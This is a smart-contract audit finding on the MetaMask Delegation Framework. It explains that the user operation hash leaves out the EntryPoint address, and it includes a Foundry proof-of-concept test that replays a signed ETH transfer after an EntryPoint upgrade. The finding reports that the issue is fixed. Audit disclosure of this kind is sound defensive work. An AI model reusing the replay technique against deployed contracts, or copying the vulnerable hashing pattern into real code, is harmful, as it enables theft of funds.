---
tags:
  - lang/solidity
  - sector/account
  - sector/bridge
  - sector/staking
  - sector/wallet
  - platform/cyfrin
  - has/github
  - severity/high
protocol: "[[Metamask Delegationframework]]"
auditors:
  - 0kage
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-18-cyfrin-Metamask-DelegationFramework1-v2.0.md"
genome:
  - "[[permit-fork-replay]]"
  - "[[replay]]"
  - "[[variant]]"
  - "[[bridge-is-secure]]"
  - "[[signature-is-unique]]"
  - "[[add-nonce]]"
  - "[[cross-chain-message]]"
---
# EntryPoint not included in user operation hash creates the possibility of Replay Attacks

- id: 55601
- impact: HIGH
- protocol: Metamask Delegationframework
- reporter: 0kage (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-18-cyfrin-Metamask-DelegationFramework1-v2.0.md

## Summary


The bug report discusses an issue with the user operation hash in the `DeleGatorCore` and `EIP7702DeleGatorCore` implementations. The hash is used to prevent replay attacks on the same or different chains. However, the current implementation does not include the `EntryPoint` address in the hash, making it vulnerable to replay attacks. A proof of concept is provided to show how the attack can be carried out. The recommended mitigation is to include the `EntryPoint` address in the hashing logic. The bug has been fixed in the Metamask codebase.

## Details

**Description:** According to `EIP-4337`, the user operation hash should be constructed in a way to protect from replay attacks either on the same chain or different chains.

[eip-4337#useroperation](https://eips.ethereum.org/EIPS/eip-4337#useroperation)
> To prevent replay attacks (both cross-chain and multiple `EntryPoint` implementations), the `signature` should depend on `chainid` and the `EntryPoint` address

> The `userOpHash` is a hash over the userOp (except signature), entryPoint and chainId.

In the current `DeleGatorCore` and `EIP7702DeleGatorCore` implementations , the user operation hash does not include the `entryPoint` address.

```solidity
    function validateUserOp(
        PackedUserOperation calldata _userOp,
>>      bytes32, //@audit ignores UserOpHash from the Entry Point
        uint256 _missingAccountFunds
    ) ... {
>>      validationData_ = _validateUserOpSignature(_userOp, getPackedUserOperationTypedDataHash(_userOp));
        _payPrefund(_missingAccountFunds);
    }
// ---------------
---
    function getPackedUserOperationTypedDataHash(PackedUserOperation calldata _userOp) public view returns (bytes32) {
        return MessageHashUtils.toTypedDataHash(_domainSeparatorV4(), getPackedUserOperationHash(_userOp));
    }
// ---------------
---
    function getPackedUserOperationHash(PackedUserOperation calldata _userOp) public pure returns (bytes32) {
        return keccak256(
            abi.encode(
                PACKED_USER_OP_TYPEHASH,
                _userOp.sender,
                _userOp.nonce,
                keccak256(_userOp.initCode),
                keccak256(_userOp.callData),
                _userOp.accountGasLimits,
                _userOp.preVerificationGas,
                _userOp.gasFees,
                keccak256(_userOp.paymasterAndData)
            )
        ); //@audeit does not include entry point address
    }
```

Note above that the `EntryPoint` address is not included in the hash generated via `getPackedUserOperationHash()`. The `_domainSeparatorV4()` will only include the `chainId` and `address(this)` but excludes the `EntryPoint` address.

**Impact:** Upgrading the delegator contract to include a new `EntryPoint` address opens the possibility of replay attacks.

**Proof of Concept:** Following POC shows the possibility of replaying previous native transfers when delegator contract is upgraded to a new `EntryPoint`.

```solidity
contract EIP7702EntryPointReplayAttackTest is BaseTest {
    using MessageHashUtils for bytes32;

    constructor() {
        IMPLEMENTATION = Implementation.EIP7702Stateless;
        SIGNATURE_TYPE = SignatureType.EOA;
    }

    // New EntryPoint to upgrade to
    EntryPoint newEntryPoint;
    // Implementation with the new EntryPoint
    EIP7702StatelessDeleGator newImpl;

    function setUp() public override {
        super.setUp();

        // Deploy a second EntryPoint
        newEntryPoint = new EntryPoint();
        vm.label(address(newEntryPoint), "New EntryPoint");

        // Deploy a new implementation connected to the new EntryPoint
        newImpl = new EIP7702StatelessDeleGator(delegationManager, newEntryPoint);
        vm.label(address(newImpl), "New EIP7702 StatelessDeleGator Impl");
    }

    function test_replayAttackAcrossEntryPoints() public {
        // 1. Create a UserOp that will be valid with the original EntryPoint
        address aliceDeleGatorAddr = address(users.alice.deleGator);

        // A simple operation to transfer ETH to Bob
        Execution memory execution = Execution({ target: users.bob.addr, value: 1 ether, callData: hex"" });

        // Create the UserOp with current EntryPoint
        bytes memory userOpCallData = abi.encodeWithSignature(EXECUTE_SINGULAR_SIGNATURE, execution);
        PackedUserOperation memory userOp = createUserOp(aliceDeleGatorAddr, userOpCallData);

        // Alice signs it with the current EntryPoint's context
        userOp.signature = signHash(users.alice, getPackedUserOperationTypedDataHash(userOp));

        // Bob's initial balance for verification
        uint256 bobInitialBalance = users.bob.addr.balance;

        // Execute the original UserOp through the first EntryPoint
        PackedUserOperation[] memory userOps = new PackedUserOperation[](1);
        userOps[0] = userOp;
        vm.prank(bundler);
        entryPoint.handleOps(userOps, bundler);

        // Verify first execution worked
        uint256 bobBalanceAfterExecution = users.bob.addr.balance;
        assertEq(bobBalanceAfterExecution, bobInitialBalance + 1 ether);

        // 2. Modify code storage
        // The code will be: 0xef0100 || address of new implementation
        vm.etch(aliceDeleGatorAddr, bytes.concat(hex"ef0100", abi.encodePacked(newImpl)));

        // Verify the implementation was updated
        assertEq(address(users.alice.deleGator.entryPoint()), address(newEntryPoint));

        // 3. Attempt to replay the original UserOp through the new EntryPoint
        vm.prank(bundler);
        newEntryPoint.handleOps(userOps, bundler);

        // 4. Verify if the attack succeeded - check if Bob received ETH again
        assertEq(users.bob.addr.balance, bobBalanceAfterExecution + 1 ether);

        console.log("Bob's initial balance was: %d", bobInitialBalance / 1 ether);
        console.log("Bob's balance after execution on old entry point was: %d", bobBalanceAfterExecution / 1 ether);
        console.log("Bob's balance after replaying user op on new entry point: %d", users.bob.addr.balance / 1 ether);
    }
}
```

**Recommended Mitigation:** Consider including `EntryPoint` address in the hashing logic of `getPackedUserOperationHash` of both `DeleGatorCore` and `EIP7702DeleGatorCore`

**Metamask:** Fixed in commit [1f91637](https://github.com/MetaMask/delegation-framework/commit/1f91637e7f61d03e012b7c9d7fc5ee4dc86ce3f3)

**Cyfrin:** Resolved. `EntryPoint` is now included in the hashing logic.

\clearpage
